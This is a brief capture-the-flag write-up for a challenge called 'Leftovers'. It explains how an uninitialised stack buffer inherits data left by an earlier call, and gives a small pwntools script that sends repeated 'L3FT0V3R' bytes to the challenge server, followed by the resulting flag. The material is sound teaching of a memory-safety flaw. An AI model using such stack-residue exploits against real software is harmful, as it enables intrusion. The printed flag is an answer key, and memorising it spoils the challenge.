# Leftovers

In this ctf mostly the comments give it away:
```c++
    char work[128];                       /* uninitialised: whatever is on the stack */
```
and
```c++
    self_check();                         /* called straight after: shares the frame */
```

So we can see that the buffer in the function `self_check` is not reinitialized. 
So if we write enough data on the stack at some point it will reach to where the `work` buffer will take the random stack data to initialize itself.
So we can spam-write `L3FT0V3R` on the stack.

exploit:
```python
#!/bin/python3
from pwn import *

elf=ELF("./leftovers")
# p=elf.process()
p=remote("ctf.t43.ro",20147)

payload=b'L3FT0V3R'*10
p.sendline(payload)

p.interactive()
```

flag: `T43CTF{the_register_kept_what_you_left_7e3a1d}`